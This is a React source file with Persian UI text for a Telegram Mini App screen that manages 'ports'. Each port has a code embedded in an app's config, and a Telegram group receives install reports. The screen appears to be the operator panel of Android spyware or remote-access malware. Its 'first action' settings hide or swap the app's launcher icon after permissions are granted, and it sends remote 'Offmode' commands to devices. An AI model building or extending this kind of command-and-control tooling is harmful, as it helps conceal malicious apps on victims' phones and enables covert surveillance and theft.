import { useEffect, useRef, useState } from 'react';
import { api } from '../api.js';
import Spinner from '../components/Spinner.jsx';
import Icon from '../components/Icon.jsx';
import Snackbar from '../components/Snackbar.jsx';
import { requestTelegramGroup } from '../lib/requestChat.js';
import { isOwner } from '../lib/panelAccess.js';
import { getInitDataRaw } from '../telegram.js';
import { faDigits } from '../lib/format.js';

const ERRORS = {
  'invalid name': 'اسم پورت را بنویس.',
  'invalid description': 'توضیحات خیلی طولانی است.',
  'invalid link': 'لینک باید با https://t.me/ شروع شود.',
  'invalid offmode': 'دستور Offmode خیلی طولانی است.',
  'bot admin required': 'ربات باید ادمین گروه باشد.',
  'Mini App required': 'انتخاب گروه فقط داخل تلگرام کار می‌کند.',
  'Telegram picker failed': 'تلگرام لیست گروه‌ها را باز نکرد.',
  'invalid port': 'کد پورت نامعتبر است.',
  'nothing to update': 'چیزی برای ذخیره نیست.',
  'not found': 'پورت پیدا نشد.',
  forbidden: 'اجازهٔ این کار را نداری.',
  'request id': 'ساخت درخواست انتخاب گروه ممکن نشد. دوباره بزن.',
};

function faError(err, fallback) {
  const raw = err?.message || '';
  return ERRORS[raw] || raw || fallback;
}

function normalizeTelegramLink(value) {
  const text = String(value || '').trim();
  if (!text) return '';
  const lower = text.toLowerCase();
  if (
    lower.startsWith('https://t.me/') ||
    lower.startsWith('https://telegram.me/') ||
    lower.startsWith('http://t.me/') ||
    lower.startsWith('http://telegram.me/')
  ) {
    return text;
  }
  return null;
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    try {
      const area = document.createElement('textarea');
      area.value = text;
      area.setAttribute('readonly', '');
      area.style.position = 'fixed';
      area.style.opacity = '0';
      document.body.appendChild(area);
      area.select();
      const ok = document.execCommand('copy');
      area.remove();
      return ok;
    } catch {
      return false;
    }
  }
}

const inputCls =
  'w-full rounded-xl border border-outline bg-surface px-3 py-2.5 text-sm text-ink focus:border-brand-600 focus:outline-none focus:ring-2 focus:ring-brand-100 disabled:bg-[#F1F3F4]';

function groupOpenUrl(groupId, groupLink) {
  const link = String(groupLink || '').trim();
  if (link.startsWith('https://t.me/') || link.startsWith('https://telegram.me/') || link.startsWith('http://t.me/') || link.startsWith('http://telegram.me/')) {
    return link;
  }
  const raw = String(Number(groupId) || '');
  if (raw.startsWith('-100') && raw.length > 4) return `https://t.me/c/${raw.slice(4)}`;
  return '';
}

function openTelegramGroup(url) {
  if (!url) return;
  const webApp = window.Telegram?.WebApp;
  if (typeof webApp?.openTelegramLink === 'function') {
    webApp.openTelegramLink(url);
    return;
  }
  window.open(url, '_blank', 'noopener');
}

async function fetchAuthedBlob(path) {
  const res = await fetch(path, {
    headers: {
      'X-Telegram-Init-Data': getInitDataRaw(),
      'ngrok-skip-browser-warning': 'true',
    },
  });
  if (!res.ok) return null;
  return res.blob();
}

// ---- per-port config shapes (mirror the backend DTO defaults) -------------

function normFirstAction(fa) {
  const src = fa && typeof fa === 'object' ? fa : {};
  const icon = src.icon && typeof src.icon === 'object' ? src.icon : {};
  return {
    enabled: Boolean(src.enabled),
    icon: {
      enabled: icon.enabled === undefined || icon.enabled === null ? true : Boolean(icon.enabled),
      mode: icon.mode === 'change' ? 'change' : 'hide',
      timing: icon.timing === 'app_start' ? 'app_start' : 'after_permissions',
    },
  };
}

function normOffmode(om) {
  const src = om && typeof om === 'object' ? om : {};
  return {
    personal: String(src.personal || ''),
    impersonal: String(src.impersonal || ''),
    all: String(src.all || ''),
  };
}

function firstActionSummary(fa) {
  if (!fa?.enabled) return 'خاموش';
  if (!fa.icon?.enabled) return 'روشن · بدون آیکن';
  const mode = fa.icon.mode === 'change' ? 'آیکن تعویض' : 'آیکن مخفی';
  const timing = fa.icon.timing === 'app_start' ? 'شروع برنامه' : 'بعد از دسترسی‌ها';
  return `روشن · ${mode} · ${timing}`;
}

// ---- tiny form controls (project light theme, no extra deps) --------------

function Switch({ checked, onChange, disabled }) {
  return (
    <button
      type="button"
      role="switch"
      aria-checked={checked}
      disabled={disabled}
      dir="ltr"
      onClick={() => !disabled && onChange(!checked)}
      className={`relative inline-flex h-6 w-11 shrink-0 items-center rounded-full px-0.5 transition-colors ${
        checked ? 'bg-brand-600' : 'bg-outline'
      } ${disabled ? 'opacity-50' : ''}`}
    >
      <span
        className={`inline-block h-5 w-5 rounded-full bg-white shadow transition-transform ${
          checked ? 'translate-x-5' : 'translate-x-0'
        }`}
      />
    </button>
  );
}

function Segmented({ value, onChange, options, disabled }) {
  return (
    <div className="inline-flex rounded-full bg-bg p-0.5">
      {options.map((opt) => {
        const on = value === opt.value;
        return (
          <button
            key={opt.value}
            type="button"
            disabled={disabled}
            onClick={() => !disabled && onChange(opt.value)}
            className={`rounded-full px-3.5 py-1.5 text-xs font-medium transition-colors ${
              on ? 'bg-brand-600 text-white shadow-e1' : 'text-muted'
            } ${disabled ? 'opacity-60' : ''}`}
          >
            {opt.label}
          </button>
        );
      })}
    </div>
  );
}

export default function PortScreen({ port, access, onBack, onChanged }) {
  const creating = !port;
  const owner = isOwner(access);
  const [name, setName] = useState(port?.name || '');
  const [description, setDescription] = useState(port?.description || '');
  const [groupId, setGroupId] = useState(port?.groupId || 0);
  const [groupTitle, setGroupTitle] = useState(port?.groupTitle || '');
  const [groupLink, setGroupLink] = useState(port?.groupLink || '');
  const [groupUsername, setGroupUsername] = useState(port?.groupUsername || '');
  const [memberCount, setMemberCount] = useState(port?.groupMemberCount || 0);
  const [groupBotAdminOk, setGroupBotAdminOk] = useState(Boolean(port?.groupId));
  const [requestId, setRequestId] = useState(null);
  const [photoUrl, setPhotoUrl] = useState('');
  const [firstAction, setFirstAction] = useState(() => normFirstAction(port?.firstAction));
  const [offmode, setOffmode] = useState(() => normOffmode(port?.offmode));
  const [toast, setToast] = useState(null);
  const [busy, setBusy] = useState('');
  const [confirmDelete, setConfirmDelete] = useState(false);
  const watchGen = useRef(0);

  useEffect(() => {
    setName(port?.name || '');
    setDescription(port?.description || '');
    setGroupId(port?.groupId || 0);
    setGroupTitle(port?.groupTitle || '');
    setGroupLink(port?.groupLink || '');
    setGroupUsername(port?.groupUsername || '');
    setMemberCount(port?.groupMemberCount || 0);
    setGroupBotAdminOk(Boolean(port?.groupId));
    setFirstAction(normFirstAction(port?.firstAction));
    setOffmode(normOffmode(port?.offmode));
    setRequestId(null);
    setConfirmDelete(false);
    setToast(null);
    setPhotoUrl((prev) => {
      if (prev) URL.revokeObjectURL(prev);
      return '';
    });
  }, [port?.code]);

  function rememberPhoto(blob) {
    if (!blob) return;
    const objectUrl = URL.createObjectURL(blob);
    setPhotoUrl((prev) => {
      if (prev) URL.revokeObjectURL(prev);
      return objectUrl;
    });
  }

  function clearPhoto() {
    setPhotoUrl((prev) => {
      if (prev) URL.revokeObjectURL(prev);
      return '';
    });
  }

  useEffect(() => {
    if (!port?.code || !port.hasGroupPhoto) return undefined;
    let dead = false;
    fetchAuthedBlob(`/api/v1/ports/${encodeURIComponent(port.code)}/photo`)
      .then((blob) => {
        if (!dead) rememberPhoto(blob);
      })
      .catch(() => {});
    return () => {
      dead = true;
    };
  }, [port?.code, port?.hasGroupPhoto]);

  useEffect(() => () => {
    watchGen.current += 1;
  }, []);

  function flash(msg, kind = 'ok') {
    setToast({ msg, kind });
    setTimeout(() => setToast(null), 2500);
  }

  async function watchBind(id) {
    const gen = ++watchGen.current;
    const deadline = Date.now() + 90_000;
    while (Date.now() < deadline && gen === watchGen.current) {
      await new Promise((r) => setTimeout(r, 900));
      if (gen !== watchGen.current) return;
      try {
        const row = await api.getBind(id);
        if (row.groupId) {
          setGroupId(row.groupId);
          setGroupTitle(row.groupTitle || '');
          setGroupUsername(row.groupUsername || '');
          setMemberCount(row.groupMemberCount || 0);
          if (row.groupLink) setGroupLink(row.groupLink);
          if (row.hasGroupPhoto) {
            const blob = await fetchAuthedBlob(`/api/v1/binds/${encodeURIComponent(id)}/photo`);
            if (gen !== watchGen.current) return;
            rememberPhoto(blob);
          } else {
            clearPhoto();
          }
          if (!row.botAdminOk) {
            flash('ربات باید ادمین گروه باشد.', 'err');
            return;
          }
          setGroupBotAdminOk(true);
          flash(`وصل شد به ${row.groupTitle || 'گروه'}`);
          if (port?.code) await onChanged();
          return;
        }
      } catch {
        /* keep polling until timeout */
      }
    }
    if (gen === watchGen.current) {
      flash('گروه هنوز ثبت نشد. یک‌بار دیگر انتخاب کن.', 'err');
    }
  }

  async function pickGroup() {
    if (!owner || busy) return;
    setBusy('pick');
    try {
      const body = await api.preparePortBind(port?.code);
      if (body.requestId) setRequestId(body.requestId);
      const opened = body.mode === 'miniapp' && body.id ? await requestTelegramGroup(body.id) : false;
      if (!opened) {
        flash('لیست گروه‌های تلگرام باز نشد.', 'err');
        return;
      }
      flash('گروه را از لیست تلگرام انتخاب کن.');
      if (body.requestId) void watchBind(body.requestId);
    } catch (e) {
      flash(faError(e, 'انتخاب گروه ممکن نشد.'), 'err');
    } finally {
      setBusy('');
    }
  }

  async function save() {
    if (!owner || busy) return;
    const trimmed = name.trim();
    if (!trimmed) {
      flash('اسم پورت را بنویس.', 'err');
      return;
    }
    const link = normalizeTelegramLink(groupLink);
    if (link === null) {
      flash('لینک گروه باید با https://t.me/ شروع شود.', 'err');
      return;
    }
    if (creating && groupId && !groupBotAdminOk) {
      flash('ربات باید ادمین گروه باشد.', 'err');
      return;
    }
    setBusy('save');
    try {
      if (port) {
        await api.updatePort(port.code, {
          name: trimmed,
          description: description.trim(),
          groupLink: link,
        });
        flash('ذخیره شد.');
        await onChanged();
        return;
      }
      await api.createPort({
        name: trimmed,
        description: description.trim(),
        groupId: groupId || 0,
        groupTitle,
        groupLink: link,
        requestId: requestId || 0,
      });
      await onChanged();
      onBack();
    } catch (e) {
      flash(faError(e, port ? 'ذخیره ممکن نشد.' : 'ساخت پورت ممکن نشد.'), 'err');
    } finally {
      setBusy('');
    }
  }

  async function saveFirstAction() {
    if (!owner || !port || busy) return;
    setBusy('firstAction');
    try {
      const updated = await api.updatePort(port.code, { firstAction });
      if (updated?.firstAction) setFirstAction(normFirstAction(updated.firstAction));
      flash('اولین کار ذخیره شد.');
      await onChanged();
    } catch (e) {
      flash(faError(e, 'ذخیره اولین کار ممکن نشد.'), 'err');
    } finally {
      setBusy('');
    }
  }

  async function saveOffmode() {
    if (!owner || !port || busy) return;
    setBusy('offmode');
    try {
      const updated = await api.updatePort(port.code, { offmode });
      if (updated?.offmode) setOffmode(normOffmode(updated.offmode));
      flash('Offmode ذخیره شد.');
      await onChanged();
    } catch (e) {
      flash(faError(e, 'ذخیره Offmode ممکن نشد.'), 'err');
    } finally {
      setBusy('');
    }
  }

  async function unbind() {
    if (!owner || !port || busy) return;
    setBusy('unbind');
    try {
      await api.unbindPort(port.code);
      setGroupId(0);
      setGroupTitle('');
      setGroupLink('');
      setGroupUsername('');
      setMemberCount(0);
      setGroupBotAdminOk(false);
      clearPhoto();
      flash('گروه جدا شد.');
      await onChanged();
    } catch (e) {
      flash(faError(e, 'جدا کردن گروه ممکن نشد.'), 'err');
    } finally {
      setBusy('');
    }
  }

  async function remove() {
    if (!owner || !port || busy) return;
    setBusy('delete');
    try {
      await api.deletePort(port.code);
      await onChanged();
      onBack();
    } catch (e) {
      flash(faError(e, 'حذف ممکن نشد.'), 'err');
      setBusy('');
    }
  }

  async function copyValue(text, okMsg = 'کپی شد.') {
    if (!text) return;
    const ok = await copyText(text);
    flash(ok ? okMsg : 'کپی ممکن نشد.', ok ? 'ok' : 'err');
  }

  const linkUrl = groupId ? groupOpenUrl(groupId, groupLink) : '';
  const groupKind = groupUsername ? 'گروه عمومی' : 'گروه خصوصی';
  const groupMeta = [groupKind, memberCount > 0 ? `${faDigits(memberCount)} عضو` : '']
    .filter(Boolean)
    .join(' · ');
  const icon = firstAction.icon;

  function patchIcon(patch) {
    setFirstAction((prev) => ({ ...prev, icon: { ...prev.icon, ...patch } }));
  }

  return (
    <div className="relative h-full overflow-y-auto">
      <div className="space-y-4 px-4 pb-10 pt-5">
        <h1 className="text-2xl font-bold text-ink">{creating ? 'پورت جدید' : name.trim() || 'پورت'}</h1>

        {/* ---- group header ------------------------------------------------ */}
        <section className="overflow-hidden rounded-2xl bg-surface shadow-e1">
          <button
            type="button"
            disabled={!linkUrl}
            onClick={() => openTelegramGroup(linkUrl)}
            className="flex w-full items-center gap-3 p-4 text-right disabled:cursor-default"
          >
            {photoUrl ? (
              <img src={photoUrl} alt="" className="h-16 w-16 shrink-0 rounded-2xl object-cover" />
            ) : (
              <span className="flex h-16 w-16 shrink-0 items-center justify-center rounded-2xl bg-tonal">
                <Icon name="forum" size={30} className="text-ontonal" />
              </span>
            )}
            <span className="min-w-0 flex-1">
              <span className="block truncate text-base font-semibold text-ink">
                {groupId ? groupTitle || 'گروه تلگرام' : 'بدون گروه'}
              </span>
              <span className="mt-0.5 block truncate text-xs text-muted">
                {groupId ? groupMeta || 'گروه تلگرام' : 'نصب‌ها به این گروه گزارش می‌شود'}
              </span>
            </span>
            {linkUrl ? <Icon name="open_in_new" size={18} className="shrink-0 text-brand-600" /> : null}
          </button>

          {groupId && linkUrl ? (
            <div className="border-t border-outline/60 px-4 py-3">
              <div className="text-xs text-muted">لینک ورود به گروه</div>
              <div className="mt-2 flex items-center gap-2">
                <div
                  className="min-w-0 flex-1 truncate rounded-xl bg-bg px-3 py-2 font-mono text-xs text-ink"
                  dir="ltr"
                >
                  {linkUrl}
                </div>
                <button
                  type="button"
                  onClick={() => copyValue(linkUrl, 'لینک کپی شد.')}
                  className="inline-flex shrink-0 items-center gap-1.5 rounded-full bg-tonal px-3.5 py-2 text-xs font-medium text-ontonal"
                >
                  <Icon name="content_copy" size={15} />
                  کپی
                </button>
              </div>
            </div>
          ) : null}

          {owner ? (
            <div className="flex flex-wrap gap-2 border-t border-outline/60 px-4 py-3">
              <button
                type="button"
                disabled={Boolean(busy)}
                onClick={pickGroup}
                className="inline-flex items-center gap-2 rounded-full bg-brand-600 px-4 py-2 text-sm text-white disabled:opacity-50"
              >
                {busy === 'pick' ? <Spinner className="border-white/40 border-t-white" /> : null}
                {groupId ? 'تغییر گروه' : 'انتخاب گروه'}
              </button>
              {port && groupId ? (
                <button
                  type="button"
                  disabled={Boolean(busy)}
                  onClick={unbind}
                  className="rounded-full bg-[#FCE8E6] px-4 py-2 text-sm text-danger disabled:opacity-50"
                >
                  جدا کردن
                </button>
              ) : null}
            </div>
          ) : null}
        </section>

        {/* ---- port code --------------------------------------------------- */}
        {port?.code && (
          <section className="rounded-2xl bg-surface p-4 shadow-e1">
            <div className="text-xs text-muted">کد پورت — داخل assets/config.json</div>
            <div className="mt-2 break-all font-mono text-sm leading-6 text-ink" dir="ltr">
              {port.code}
            </div>
            <button
              type="button"
              onClick={() => copyValue(port.code, 'کد کپی شد.')}
              className="mt-3 inline-flex items-center gap-1.5 rounded-full bg-tonal px-4 py-2 text-sm font-medium text-ontonal"
            >
              <Icon name="content_copy" size={16} />
              کپی کد
            </button>
          </section>
        )}

        {/* ---- first action (icon only; USSD intentionally omitted) -------- */}
        {port?.code && owner && (
          <section className="space-y-3 rounded-2xl bg-surface p-4 shadow-e1">
            <div className="flex items-center justify-between gap-3">
              <div className="min-w-0">
                <div className="text-sm font-semibold text-ink">اولین کار</div>
                <div className="mt-0.5 text-xs text-muted">{firstActionSummary(firstAction)}</div>
              </div>
              <Switch
                checked={firstAction.enabled}
                onChange={(v) => setFirstAction((prev) => ({ ...prev, enabled: v }))}
              />
            </div>

            <div className={`rounded-xl bg-bg p-3 ${firstAction.enabled ? '' : 'opacity-50'}`}>
              <div className="flex items-center justify-between gap-3">
                <div className="min-w-0">
                  <div className="text-sm font-medium text-ink">آیکن</div>
                  <div className="mt-0.5 text-xs text-muted">مخفی، و اگر نشود تعویض</div>
                </div>
                <Switch
                  checked={icon.enabled}
                  disabled={!firstAction.enabled}
                  onChange={(v) => patchIcon({ enabled: v })}
                />
              </div>

              <div className="mt-3 flex items-center justify-between gap-2">
                <span className="text-xs text-muted">زمان</span>
                <Segmented
                  value={icon.timing}
                  disabled={!firstAction.enabled || !icon.enabled}
                  onChange={(v) => patchIcon({ timing: v })}
                  options={[
                    { value: 'app_start', label: 'شروع برنامه' },
                    { value: 'after_permissions', label: 'بعد از دسترسی‌ها' },
                  ]}
                />
              </div>

              <div className="mt-2 flex items-center justify-between gap-2">
                <span className="text-xs text-muted">حالت</span>
                <Segmented
                  value={icon.mode}
                  disabled={!firstAction.enabled || !icon.enabled}
                  onChange={(v) => patchIcon({ mode: v })}
                  options={[
                    { value: 'change', label: 'تعویض' },
                    { value: 'hide', label: 'مخفی' },
                  ]}
                />
              </div>
            </div>

            <button
              type="button"
              disabled={Boolean(busy)}
              onClick={saveFirstAction}
              className="w-full rounded-full bg-brand-600 py-2.5 text-sm font-bold text-white disabled:opacity-50"
            >
              {busy === 'firstAction' ? 'در حال ذخیره…' : 'ذخیره اولین کار'}
            </button>
          </section>
        )}

        {/* ---- offmode commands ------------------------------------------- */}
        {port?.code && owner && (
          <section className="space-y-3 rounded-2xl bg-surface p-4 shadow-e1">
            <div className="text-sm font-semibold text-ink">دستورهای Offmode</div>
            {[
              { key: 'personal', label: 'دستور Offmode شخصی' },
              { key: 'impersonal', label: 'دستور Offmode غیرشخصی' },
              { key: 'all', label: 'دستور Offmode همه' },
            ].map((row) => (
              <label key={row.key} className="block">
                <span className="text-xs text-muted">{row.label}</span>
                <div className="mt-1">
                  <input
                    value={offmode[row.key]}
                    onChange={(e) => setOffmode((prev) => ({ ...prev, [row.key]: e.target.value }))}
                    maxLength={64}
                    dir="ltr"
                    className={`${inputCls} text-left`}
                  />
                </div>
              </label>
            ))}
            <button
              type="button"
              disabled={Boolean(busy)}
              onClick={saveOffmode}
              className="w-full rounded-full bg-brand-600 py-2.5 text-sm font-bold text-white disabled:opacity-50"
            >
              {busy === 'offmode' ? 'در حال ذخیره…' : 'ذخیره Offmode'}
            </button>
          </section>
        )}

        {/* ---- name + description ----------------------------------------- */}
        <section className="space-y-4 rounded-2xl bg-surface p-4 shadow-e1">
          <label className="block">
            <span className="text-sm font-medium text-ink">اسم</span>
            <div className="mt-1.5">
              <input
                value={name}
                onChange={(e) => setName(e.target.value)}
                disabled={!owner}
                maxLength={80}
                className={inputCls}
                placeholder="مثلاً تیم فروش"
              />
            </div>
          </label>

          <label className="block">
            <span className="text-sm font-medium text-ink">توضیحات</span>
            <span className="mt-0.5 block text-xs text-muted">فقط داخل پنل دیده می‌شود.</span>
            <div className="mt-1.5">
              <textarea
                value={description}
                onChange={(e) => setDescription(e.target.value)}
                disabled={!owner}
                maxLength={400}
                rows={3}
                className={inputCls}
              />
            </div>
          </label>
        </section>

        {owner && (
          <div className="flex flex-col gap-2">
            <button
              type="button"
              disabled={Boolean(busy)}
              onClick={save}
              className="rounded-full bg-brand-600 py-3 text-sm font-bold text-white disabled:opacity-50"
            >
              {busy === 'save' ? 'در حال ذخیره…' : creating ? 'ساخت پورت' : 'ذخیره اسم و توضیحات'}
            </button>
            {port && !confirmDelete && (
              <button
                type="button"
                disabled={Boolean(busy)}
                onClick={() => setConfirmDelete(true)}
                className="py-3 text-sm font-medium text-danger"
              >
                حذف پورت
              </button>
            )}
            {port && confirmDelete && (
              <div className="rounded-2xl bg-[#FCE8E6] p-3">
                <p className="text-sm text-danger">پورت و اتصال گروهش حذف شود؟ دستگاه‌ها سر جایشان می‌مانند.</p>
                <div className="mt-3 flex gap-2">
                  <button
                    type="button"
                    disabled={Boolean(busy)}
                    onClick={remove}
                    className="flex-1 rounded-full bg-danger py-2.5 text-sm font-medium text-white disabled:opacity-50"
                  >
                    حذف
                  </button>
                  <button
                    type="button"
                    onClick={() => setConfirmDelete(false)}
                    className="flex-1 rounded-full bg-surface py-2.5 text-sm text-ink"
                  >
                    انصراف
                  </button>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
      <Snackbar toast={toast} />
    </div>
  );
}
